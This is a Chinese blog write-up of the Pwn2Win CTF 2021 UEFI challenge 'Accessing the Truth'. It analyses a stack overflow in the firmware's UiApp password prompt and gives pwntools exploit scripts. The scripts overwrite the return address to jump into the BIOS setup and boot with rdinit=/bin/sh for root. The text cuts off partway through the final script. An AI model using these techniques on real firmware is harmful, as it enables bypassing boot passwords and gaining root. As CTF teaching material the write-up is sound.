@@ -1,0 +1,356 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>解决第一个UEFI PWN——Accessing the Truth解题思路 | Sung3r&#39;s Blog</title>
+  <meta name="author" content="sung3r">
+  
+  <meta name="description" content="Pwn2Win CTF 2021 Accessing the Truth的解题思路">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="解决第一个UEFI PWN——Accessing the Truth解题思路"/>
+  <meta property="og:site_name" content="Sung3r&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Sung3r&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 解决第一个UEFI PWN——Accessing the Truth解题思路</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> Pwn2Win CTF 2021 Accessing the Truth的解题思路
+		 </div> <!-- alert -->
+	  		
+
+	  <p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/243007" target="_blank" rel="noopener">解决第一个UEFI PWN——Accessing the Truth解题思路</a></p>
+<p>前段时间打了场PWN2WIN，期间遇到了这道BIOS题，正好来学习一下UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448541945-1622448541947.png" alt="title"></p>
+<p>题目包含下列文件<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448612466-1622448612467.png" alt="title"></p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p><code>run.py</code>是题目给的启动脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3 -u</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import subprocess</span><br><span class="line">import tempfile</span><br><span class="line"></span><br><span class="line">def random_string(n):</span><br><span class="line">    return &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(n))</span><br><span class="line"></span><br><span class="line">def check_pow(bits):</span><br><span class="line">    r &#x3D; random_string(10)</span><br><span class="line">    print(f&quot;hashcash -mb&#123;bits&#125; &#123;r&#125;&quot;)</span><br><span class="line">    solution &#x3D; input(&quot;Solution: \n&quot;).strip()</span><br><span class="line">    if subprocess.call([&quot;hashcash&quot;, f&quot;-cdb&#123;bits&#125;&quot;, &quot;-r&quot;, r, solution],</span><br><span class="line">                       cwd&#x3D;&quot;&#x2F;tmp&quot;,</span><br><span class="line">                       stdout&#x3D;subprocess.DEVNULL,</span><br><span class="line">                       stderr&#x3D;subprocess.DEVNULL) !&#x3D; 0:</span><br><span class="line">        raise Exception(&quot;Invalid PoW&quot;)</span><br><span class="line"></span><br><span class="line">#check_pow(25)</span><br><span class="line"></span><br><span class="line">fname &#x3D; tempfile.NamedTemporaryFile().name</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;cp&quot;, &quot;OVMF.fd&quot;, fname])</span><br><span class="line">try:</span><br><span class="line">  subprocess.call([&quot;chmod&quot;, &quot;u+w&quot;, fname])</span><br><span class="line">  subprocess.call([&quot;qemu-system-x86_64&quot;,</span><br><span class="line">                   &quot;-monitor&quot;, &quot;&#x2F;dev&#x2F;null&quot;,</span><br><span class="line">                   &quot;-m&quot;, &quot;64M&quot;,</span><br><span class="line">                   &quot;-drive&quot;, &quot;if&#x3D;pflash,format&#x3D;raw,file&#x3D;&quot; + fname, </span><br><span class="line">                   &quot;-drive&quot;, &quot;file&#x3D;fat:rw:contents,format&#x3D;raw&quot;,</span><br><span class="line">                   &quot;-net&quot;, &quot;none&quot;,</span><br><span class="line">                   &quot;-nographic&quot;], stderr&#x3D;subprocess.DEVNULL, timeout&#x3D;60)</span><br><span class="line">except:</span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;rm&quot;, &quot;-rf&quot;, fname])</span><br><span class="line">print(&quot;Bye!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>注释掉pow，直接启动。启动起来是一个低权限用户的linux虚拟机，目标是获取根目录下flag.txt的内容，典型的内核题<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449605453-1622449605456.png" alt="title"></p>
+<p>仔细看启动命令，貌似没加载任何可疑的虚拟设备，排除掉QEMU逃逸<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449718327-1622449718327.png" alt="title"></p>
+<p>解开<code>contents/initramfs.cpio</code>，看到init文件。这里有一条<code>mount -t efivarfs efivarfs /sys/firmware/efi/efivars</code>，怀疑是UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449853859-1622449853860.png" alt="title"></p>
+<p>另外，启动脚本里有60秒的timout，需要把这里干掉<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450018868-1622450018871.png" alt="title"></p>
+<h1 id="解开OVMF"><a href="#解开OVMF" class="headerlink" title="解开OVMF"></a>解开OVMF</h1><p>找到一个工具<a href="https://github.com/LongSoft/UEFITool" target="_blank" rel="noopener">UEFITool</a>能打开OVMF.fd，里面的文件貌似是PE32格式<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450282258-1622450282259.png" alt="title"></p>
+<p>binwalk也能识别出来是PE，无奈还是解不开，继续找工具<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450375285-1622450375286.png" alt="title"></p>
+<p>发现这工具能解开：<a href="https://github.com/theopolis/uefi-firmware-parser" target="_blank" rel="noopener">UEFI Firmware Parser</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uefi-firmware-parser -ecO .&#x2F;OVMF.fd</span><br></pre></td></tr></table></figure>
+
+<p>解开后发现一堆pe raw文件<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450623930-1622450623931.png" alt="title"></p>
+<h1 id="定位到UiApp"><a href="#定位到UiApp" class="headerlink" title="定位到UiApp"></a>定位到UiApp</h1><p>既然是BIOS PWN，那就先进BIOS吧，启动时连按F12就进来了。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450782520-1622450782521.png" alt="title"></p>
+<p>进BIOS以后有一个密码校验，过了应该就能进BIOS。此外，还发现了以下一些信息<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450896835-1622450896836.png" alt="title"></p>
+<p>拿UEFITool能搜到些信息<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622451005588-1622451005589.png" alt="title"></p>
+<p>这里的id貌似能跟进BIOS的id对得上，这个应该是GUID<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622451099030-1622451099031.png" alt="title"></p>
+<p>在解开的文件里搜<code>462CAA21-7614-4503-836E-8AB6F4662331</code>，找到了这个目录<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622451418910-1622451418911.png" alt="title"></p>
+<p>IDA打开<code>section0.pe</code>，分析完以后这里选<code>Unicode</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622451585290-1622451585293.png" alt="title"></p>
+<p>查找字符串，就能看到<code>Enter Password:</code>，可以确定<code>section0.pe</code>就是UiApp这个登录校验程序<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622451633640-1622451633641.png" alt="title"></p>
+<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>校验程序有个sha256<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622451899595-1622451899597.png" alt="title"></p>
+<p>漏洞点在：<code>\n</code>不会让while循环break掉，同时index不断自增1，<code>buf = &amp;input_buf[index];</code>获取到的栈地址继续往后延，这样可能会覆盖到返回地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *v3; &#x2F;&#x2F; rsp</span><br><span class="line">  void *v4; &#x2F;&#x2F; rsp</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rdx</span><br><span class="line">  __int64 v6; &#x2F;&#x2F; r8</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; r9</span><br><span class="line">  size_t v8; &#x2F;&#x2F; rdx</span><br><span class="line">  __int64 v9; &#x2F;&#x2F; r8</span><br><span class="line">  __int64 v10; &#x2F;&#x2F; r9</span><br><span class="line">  char *buf; &#x2F;&#x2F; rdx</span><br><span class="line">  unsigned __int64 v12; &#x2F;&#x2F; rax</span><br><span class="line">  __int64 v13; &#x2F;&#x2F; rdx</span><br><span class="line">  __int64 v14; &#x2F;&#x2F; r8</span><br><span class="line">  __int64 v15; &#x2F;&#x2F; r9</span><br><span class="line">  char v17[7]; &#x2F;&#x2F; [rsp+20h] [rbp-60h] BYREF</span><br><span class="line">  char c; &#x2F;&#x2F; [rsp+27h] [rbp-59h]</span><br><span class="line">  char *input_buf; &#x2F;&#x2F; [rsp+28h] [rbp-58h]</span><br><span class="line">  __int64 v20; &#x2F;&#x2F; [rsp+30h] [rbp-50h]</span><br><span class="line">  char *v21; &#x2F;&#x2F; [rsp+38h] [rbp-48h]</span><br><span class="line">  __int64 v22; &#x2F;&#x2F; [rsp+40h] [rbp-40h]</span><br><span class="line">  size_t v23; &#x2F;&#x2F; [rsp+48h] [rbp-38h]</span><br><span class="line">  unsigned __int64 v24; &#x2F;&#x2F; [rsp+50h] [rbp-30h]</span><br><span class="line">  __int64 index; &#x2F;&#x2F; [rsp+58h] [rbp-28h]</span><br><span class="line"></span><br><span class="line">  v24 &#x3D; 0i64;</span><br><span class="line">  index &#x3D; -1i64;</span><br><span class="line">  v23 &#x3D; 32i64;</span><br><span class="line">  v22 &#x3D; 31i64;</span><br><span class="line">  v3 &#x3D; alloca(32i64);</span><br><span class="line">  v21 &#x3D; v17;</span><br><span class="line">  v20 &#x3D; 31i64;</span><br><span class="line">  v4 &#x3D; alloca(32i64);</span><br><span class="line">  input_buf &#x3D; v17;</span><br><span class="line">  wputs(word_1395A, 15i64, 32i64, 0i64);</span><br><span class="line">  while ( v24 &lt;&#x3D; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_9D3(input_buf, v23, 0i64);</span><br><span class="line">    index &#x3D; -1i64;</span><br><span class="line">    wputs(L&quot;Enter Password: \n&quot;, v5, v6, v7);</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      c &#x3D; getchar();</span><br><span class="line">      ++index;</span><br><span class="line">      if ( c &#x3D;&#x3D; &#39;\r&#39; )</span><br><span class="line">        break;</span><br><span class="line">      if ( c !&#x3D; &#39;\n&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        buf &#x3D; &amp;input_buf[index];</span><br><span class="line">        *buf &#x3D; c;</span><br><span class="line">        wputs(L&quot;*&quot;, buf, v9, v10);</span><br><span class="line">        v12 &#x3D; wstr_length(input_buf);</span><br><span class="line">        v8 &#x3D; v23 - 1;</span><br><span class="line">        if ( v12 &gt;&#x3D; v23 - 1 )</span><br><span class="line">          break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    wputs(L&quot;\n&quot;, v8, v9, v10);</span><br><span class="line">    sha256_process(input_buf, index, v21);</span><br><span class="line">    if ( !((__int64 (__fastcall *)(char *, void *, size_t))memcmp)(v21, &amp;unk_1B840, v23) )</span><br><span class="line">      return 1;</span><br><span class="line">    wputs(L&quot;Wrong!!\n&quot;, v13, v14, v15);</span><br><span class="line">    ++v24;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>UiApp没开ASLR和NX，溢出后直接在栈执行shellcode即可<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622452354570-1622452354572.png" alt="title"></p>
+<h1 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h1><p>启动脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">tube.s &#x3D; tube.send</span><br><span class="line">tube.sl &#x3D; tube.sendline</span><br><span class="line">tube.sa &#x3D; tube.sendafter</span><br><span class="line">tube.sla &#x3D; tube.sendlineafter</span><br><span class="line">tube.r &#x3D; tube.recv</span><br><span class="line">tube.ru &#x3D; tube.recvuntil</span><br><span class="line">tube.rl &#x3D; tube.recvline</span><br><span class="line">tube.ra &#x3D; tube.recvall</span><br><span class="line">tube.rr &#x3D; tube.recvregex</span><br><span class="line">tube.irt &#x3D; tube.interactive</span><br><span class="line"></span><br><span class="line">DEBUG &#x3D; 1</span><br><span class="line"></span><br><span class="line">if DEBUG &#x3D;&#x3D; 0:</span><br><span class="line">    fname &#x3D; &quot;&#x2F;tmp&#x2F;test_uefi&quot;</span><br><span class="line">    os.system(&quot;cp OVMF.fd %s&quot; % (fname))</span><br><span class="line">    os.system(&quot;chmod u+w %s&quot; % (fname))</span><br><span class="line"></span><br><span class="line">    p &#x3D; process([&quot;qemu-system-x86_64&quot;, &quot;-m&quot;, &quot;64M&quot;, &quot;-drive&quot;, &quot;if&#x3D;pflash,format&#x3D;raw,file&#x3D;&quot;+fname, &quot;-drive&quot;,</span><br><span class="line">                    &quot;file&#x3D;fat:rw:contents,format&#x3D;raw&quot;, &quot;-net&quot;, &quot;none&quot;, &quot;-nographic&quot;], env&#x3D;&#123;&#125;)</span><br><span class="line">elif DEBUG &#x3D;&#x3D; 1:</span><br><span class="line">    fname &#x3D; &quot;&#x2F;tmp&#x2F;test_uefi&quot;</span><br><span class="line">    os.system(&quot;cp OVMF.fd %s&quot; % (fname))</span><br><span class="line">    os.system(&quot;chmod u+w %s&quot; % (fname))</span><br><span class="line"></span><br><span class="line">    p &#x3D; process([&quot;qemu-system-x86_64&quot;, &quot;-s&quot;, &quot;-m&quot;, &quot;64M&quot;, &quot;-drive&quot;, &quot;if&#x3D;pflash,format&#x3D;raw,file&#x3D;&quot;+fname, &quot;-drive&quot;,</span><br><span class="line">                    &quot;file&#x3D;fat:rw:contents,format&#x3D;raw&quot;, &quot;-net&quot;, &quot;none&quot;, &quot;-nographic&quot;], env&#x3D;&#123;&#125;)</span><br><span class="line">elif DEBUG &#x3D;&#x3D; 2:</span><br><span class="line">    p &#x3D; remote(&#39;accessing-the-truth.pwn2win.party&#39;, 1337)</span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    p.recvn(1)</span><br><span class="line">    # sleep(1)</span><br><span class="line">    p.send(&quot;\x1b[24~&quot;)</span><br><span class="line"></span><br><span class="line">    p.irt()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+<p>启动脚本加上<code>-s</code>参数，进BIOS以后gdb attach上<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622515211660-1622515211690.png" alt="title"></p>
+<p>问题就是怎么拿到UiApp的加载地址？尝试在gdb里搜这段数据<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622515490159-1622515490161.png" alt="title"></p>
+<p>找到三个地址，这里的<code>0x28ba990</code>比较可疑<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622515668003-1622515668004.png" alt="title"><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622515768538-1622515768539.png" alt="title"></p>
+<p>减去<code>Enter Password:</code>的offset，即<code>0x28ba990-0x13990 = 0x28a7000</code>，然后以<code>0x28a7000</code>为基址查看main函数的代码<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622515997648-1622515997650.png" alt="title"></p>
+<p>可以断定<code>0x28a7000</code>就是UiApp的加载基址<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622516039985-1622516039986.png" alt="title"></p>
+<p>用<code>0x28a7000</code>修正IDA分析的基址<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622516156684-1622516156686.png" alt="title"></p>
+<p>在IDA打上断点，给UiApp发以下数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def exploit():</span><br><span class="line">    p.recvn(1)</span><br><span class="line">    # sleep(1)</span><br><span class="line">    p.send(&quot;\x1b[24~&quot;)</span><br><span class="line"></span><br><span class="line">    #print(p.recvuntil(&quot;Password&quot;))</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sa(&#39;Password&#39;, &#39;A&#39;*2+&#39;\n&#39;*2+&#39;B&#39;*0x18+&#39;\r&#39;)</span><br><span class="line"></span><br><span class="line">    p.irt()</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>&#39;\n&#39;*2</code>，buf跳过了两个byte的地址，因而发送足够多<code>\n</code>便可溢出到返回地址<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622516453144-1622516453145.png" alt="title"></p>
+<h1 id="Hijack-to-BIOS-Booting"><a href="#Hijack-to-BIOS-Booting" class="headerlink" title="Hijack to BIOS Booting"></a>Hijack to BIOS Booting</h1><p><code>&amp;buf = 0x3EBC650</code>距离返回地址<code>0x3EBC6F0-0x3EBC650+8 = 0xa8</code>byte<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622532741358-1622532741361.png" alt="title"></p>
+<p>这样构造便能覆盖到返回地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; b&#39;\n&#39;*0xa8 + p32(0xdeadbeaf)</span><br><span class="line">payload +&#x3D; b&#39;\r&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622533054213-1622533054215.png" alt="title"></p>
+<p>控了rip以后，需要将rip劫持到BIOS正常启动的代码，这片代码便是过了校验后启动BIOS程序<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622533130958-1622533130959.png" alt="title"></p>
+<p>对应的汇编代码，尝试劫持到<code>0x28B0DD5</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622533204914-1622533204914.png" alt="title"></p>
+<p>另外，发送<code>/r</code>会导致break while，只要令<code>v25&gt;=3</code>即发送三次<code>\r</code>便能跳出外层while并return。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622533302693-1622533302694.png" alt="title"></p>
+<p>现在已经看到能启动到BIOS了<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622533547445-1622533547446.png" alt="title"></p>
+<p>但pwntools连接的图形操作还有问题，可以用socat来连</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -,raw,<span class="built_in">echo</span>=0 SYSTEM:<span class="string">"python ./solve.py"</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622534021362-1622534021363.png" alt="title"></p>
+<p>进入BIOS，增加一条启动项，启动内容加上<code>rdinit=/bin/sh</code>，保存后选该启动项来启动系统<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622534264954-1622534264955.png" alt="title"></p>
+<p>启动进入到系统，现在已经是root权限<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622534300567-1622534300568.png" alt="title"></p>
+<p>打远程<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/06/01/1622538370732-1622538370734.png" alt="title"></p>
+<h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><p>完整EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#socat STDIO,icanon=0,echo=0 SYSTEM:"python ./solve.py"</span></span><br><span class="line"><span class="comment">#socat -,raw,echo=0 SYSTEM:"python ./solve.py"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">tube.s = tube.send</span><br><span class="line">tube.sl = tube.sendline</span><br><span class="line">tube.sa = tube.sendafter</span><br><span class="line">tube.sla = tube.sendlineafter</span><br><span class="line">tube.r = tube.recv</span><br><span class="line">tube.ru = tube.recvuntil</span><br><span class="line">tube.rl = tube.recvline</span><br><span class="line">tube.rn = tube.recvn</span><br><span class="line">tube.ra = tube.recvall</span><br><span class="line">tube.rr = tube.recvregex</span><br><span class="line">tube.irt = tube.interactive</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">0</span>:</span><br><span class="line">    fname = <span class="string">"/tmp/test_uefi"</span></span><br><span class="line">    os.system(<span class="string">"cp OVMF.fd %s"</span> % (fname))</span><br><span class="line">    os.system(<span class="string">"chmod u+w %s"</span> % (fname))</span><br><span class="line"></span><br><span class="line">    p = process([<span class="string">"qemu-system-x86_64"</span>, <span 